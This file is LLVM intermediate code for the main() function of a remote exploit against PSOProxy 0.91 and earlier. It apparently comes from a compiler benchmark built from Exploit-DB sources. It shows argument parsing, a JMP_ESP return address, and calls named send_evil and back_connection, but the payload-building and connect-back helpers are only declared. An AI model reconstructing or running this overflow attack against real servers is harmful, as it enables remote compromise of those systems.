; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_23733.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_23733.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i8*, i32 }

@D_PORT = common dso_local global i32 0, align 4
@JMP_ESP = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [7 x i8] c"h:p:t:\00", align 1
@SIZE = common dso_local global i32 0, align 4
@opterr = common dso_local global i64 0, align 8
@stdout = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [34 x i8] c"PSOProxy <= 0.91 remote exploit\0D\0A\00", align 1
@.str.2 = private unnamed_addr constant [55 x i8] c"Bug found by Donato Ferrante <fdonato@autistici.org>\0D\0A\00", align 1
@.str.3 = private unnamed_addr constant [45 x i8] c"Exploit written by Li0n7 <Li0n7@voila.fr>\0D\0A\0A\00", align 1
@optarg = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [29 x i8] c"[-] Host address incorrect.\0A\00", align 1
@exp_os = common dso_local global %struct.TYPE_2__* null, align 8
@.str.5 = private unnamed_addr constant [26 x i8] c"Platforms supported are:\0A\00", align 1
@.str.6 = private unnamed_addr constant [17 x i8] c"\09%i - %s - 0x%x\0A\00", align 1
@.str.7 = private unnamed_addr constant [25 x i8] c"[-] option '%c' unknown\0A\00", align 1
@optopt = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i64, align 8
  %11 = alloca i64, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %15 = load i32, i32* @D_PORT, align 4
  store i32 %15, i32* %9, align 4
  store i64 0, i64* %10, align 8
  %16 = load i64, i64* @JMP_ESP, align 8
  store i64 %16, i64* %11, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0), i8** %12, align 8
  %17 = load i32, i32* @SIZE, align 4
  %18 = zext i32 %17 to i64
  %19 = call i8* @llvm.stacksave()
  store i8* %19, i8** %13, align 8
  %20 = alloca i8, i64 %18, align 16
  store i64 %18, i64* %14, align 8
  store i64 0, i64* @opterr, align 8
  %21 = load i32, i32* @stdout, align 4
  %22 = call i32 (i32, i8*, ...) @fprintf(i32 %21, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.1, i64 0, i64 0))
  %23 = load i32, i32* @stdout, align 4
  %24 = call i32 (i32, i8*, ...) @fprintf(i32 %23, i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.2, i64 0, i64 0))
  %25 = load i32, i32* @stdout, align 4
  %26 = call i32 (i32, i8*, ...) @fprintf(i32 %25, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.3, i64 0, i64 0))
  %27 = load i32, i32* %4, align 4
  %28 = icmp slt i32 %27, 2
  br i1 %28, label %29, label %34

29:                                               ; preds = %2
  %30 = load i8**, i8*** %5, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 0
  %32 = load i8*, i8** %31, align 8
  %33 = call i32 @die(i8* %32)
  br label %34

34:                                               ; preds = %29, %2
  br label %35

35:                                               ; preds = %136, %34
  %36 = load i32, i32* %4, align 4
  %37 = load i8**, i8*** %5, align 8
  %38 = load i8*, i8** %12, align 8
  %39 = call i32 @getopt(i32 %36, i8** %37, i8* %38)
  store i32 %39, i32* %7, align 4
  %40 = icmp ne i32 %39, -1
  br i1 %40, label %41, label %137

41:                                               ; preds = %35
  %42 = load i32, i32* %7, align 4
  switch i32 %42, label %136 [
    i32 104, label %43
    i32 112, label %53
    i32 116, label %65
    i32 63, label %128
  ]

43:                                               ; preds = %41
  %44 = load i32, i32* @optarg, align 4
  %45 = call i64 @resolve_host(i32 %44)
  store i64 %45, i64* %10, align 8
  %46 = load i64, i64* %10, align 8
  %47 = icmp ne i64 %46, 0
  br i1 %47, label %52, label %48

48:                                               ; preds = %43
  %49 = load i32, i32* @stderr, align 4
  %50 = call i32 (i32, i8*, ...) @fprintf(i32 %49, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.4, i64 0, i64 0))
  %51 = call i32 @exit(i32 0) #4
  unreachable

52:                                               ; preds = %43
  br label %136

53:                                               ; preds = %41
  %54 = load i32, i32* @optarg, align 4
  %55 = call i64 @atoi(i32 %54)
  %56 = trunc i64 %55 to i32
  store i32 %56, i32* %9, align 4
  %57 = load i32, i32* %9, align 4
  %58 = icmp sgt i32 %57, 65535
  br i1 %58, label %62, label %59

59:                                               ; preds = %53
  %60 = load i32, i32* %9, align 4
  %61 = icmp slt i32 %60, 0
  br i1 %61, label %62, label %64

62:                                               ; preds = %59, %53
  %63 = call i32 @exit(i32 1) #4
  unreachable

64:                                               ; preds = %59
  br label %136

65:                                               ; preds = %41
  store i32 0, i32* %6, align 4
  br label %66

66:                                               ; preds = %117, %65
  %67 = load %struct.TYPE_2__*, %struct.TYPE_2__** @exp_os, align 8
  %68 = load i32, i32* %6, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %67, i64 %69
  %71 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %70, i32 0, i32 0
  %72 = load i8*, i8** %71, align 8
  %73 = icmp ne i8* %72, null
  br i1 %73, label %74, label %120

74:                                               ; preds = %66
  %75 = load i32, i32* @optarg, align 4
  %76 = call i64 @atoi(i32 %75)
  %77 = load i32, i32* %6, align 4
  %78 = sext i32 %77 to i64
  %79 = icmp ugt i64 %76, %78
  br i1 %79, label %84, label %80

80:                                               ; preds = %74
  %81 = load i32, i32* @optarg, align 4
  %82 = call i64 @atoi(i32 %81)
  %83 = icmp ult i64 %82, 0
  br i1 %83, label %84, label %116

84:                                               ; preds = %80, %74
  %85 = load i32, i32* @stderr, align 4
  %86 = call i32 (i32, i8*, ...) @fprintf(i32 %85, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.5, i64 0, i64 0))
  store i32 0, i32* %6, align 4
  br label %87

87:                                               ; preds = %111, %84
  %88 = load %struct.TYPE_2__*, %struct.TYPE_2__** @exp_os, align 8
  %89 = load i32, i32* %6, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %88, i64 %90
  %92 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %91, i32 0, i32 0
  %93 = load i8*, i8** %92, align 8
  %94 = icmp ne i8* %93, null
  br i1 %94, label %95, label %114

95:                                               ; preds = %87
  %96 = load i32, i32* @stderr, align 4
  %97 = load i32, i32* %6, align 4
  %98 = load %struct.TYPE_2__*, %struct.TYPE_2__** @exp_os, align 8
  %99 = load i32, i32* %6, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %98, i64 %100
  %102 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %101, i32 0, i32 0
  %103 = load i8*, i8** %102, align 8
  %104 = load %struct.TYPE_2__*, %struct.TYPE_2__** @exp_os, align 8
  %105 = load i32, i32* %6, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %104, i64 %106
  %108 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %107, i32 0, i32 1
  %109 = load i32, i32* %108, align 8
  %110 = call i32 (i32, i8*, ...) @fprintf(i32 %96, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.6, i64 0, i64 0), i32 %97, i8* %103, i32 %109)
  br label %111

111:                                              ; preds = %95
  %112 = load i32, i32* %6, align 4
  %113 = add nsw i32 %112, 1
  store i32 %113, i32* %6, align 4
  br label %87

114:                                              ; preds = %87
  %115 = call i32 @exit(i32 1) #4
  unreachable

116:                                              ; preds = %80
  br label %117

117:                                              ; preds = %116
  %118 = load i32, i32* %6, align 4
  %119 = add nsw i32 %118, 1
  store i32 %119, i32* %6, align 4
  br label %66

120:                                              ; preds = %66
  %121 = load %struct.TYPE_2__*, %struct.TYPE_2__** @exp_os, align 8
  %122 = load i32, i32* @optarg, align 4
  %123 = call i64 @atoi(i32 %122)
  %124 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %121, i64 %123
  %125 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %124, i32 0, i32 1
  %126 = load i32, i32* %125, align 8
  %127 = sext i32 %126 to i64
  store i64 %127, i64* %11, align 8
  br label %136

128:                                              ; preds = %41
  %129 = load i32, i32* @stderr, align 4
  %130 = load i32, i32* @optopt, align 4
  %131 = call i32 (i32, i8*, ...) @fprintf(i32 %129, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.7, i64 0, i64 0), i32 %130)
  %132 = load i8**, i8*** %5, align 8
  %133 = getelementptr inbounds i8*, i8** %132, i64 0
  %134 = load i8*, i8** %133, align 8
  %135 = call i32 @die(i8* %134)
  br label %136

136:                                              ; preds = %128, %41, %120, %64, %52
  br label %35

137:                                              ; preds = %35
  %138 = load i64, i64* %10, align 8
  %139 = load i32, i32* %9, align 4
  %140 = call i32 @set_connection(i64 %138, i32 %139)
  store i32 %140, i32* %8, align 4
  %141 = load i64, i64* %11, align 8
  %142 = call i32 @build(i64 %141)
  %143 = load i32, i32* @SIZE, align 4
  %144 = sub nsw i32 %143, 1
  %145 = call i32 @strncpy(i8* %20, i32 %142, i32 %144)
  %146 = load i32, i32* @SIZE, align 4
  %147 = sub nsw i32 %146, 1
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds i8, i8* %20, i64 %148
  store i8 0, i8* %149, align 1
  %150 = load i32, i32* %8, align 4
  %151 = call i32 @send_evil(i32 %150, i8* %20)
  %152 = load i64, i64* %10, align 8
  %153 = call i32 @back_connection(i64 %152)
  store i32 0, i32* %3, align 4
  %154 = load i8*, i8** %13, align 8
  call void @llvm.stackrestore(i8* %154)
  %155 = load i32, i32* %3, align 4
  ret i32 %155
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @fprintf(i32, i8*, ...) #2

declare dso_local i32 @die(i8*) #2

declare dso_local i32 @getopt(i32, i8**, i8*) #2

declare dso_local i64 @resolve_host(i32) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i64 @atoi(i32) #2

declare dso_local i32 @set_connection(i64, i32) #2

declare dso_local i32 @strncpy(i8*, i32, i32) #2

declare dso_local i32 @build(i64) #2

declare dso_local i32 @send_evil(i32, i8*) #2

declare dso_local i32 @back_connection(i64) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
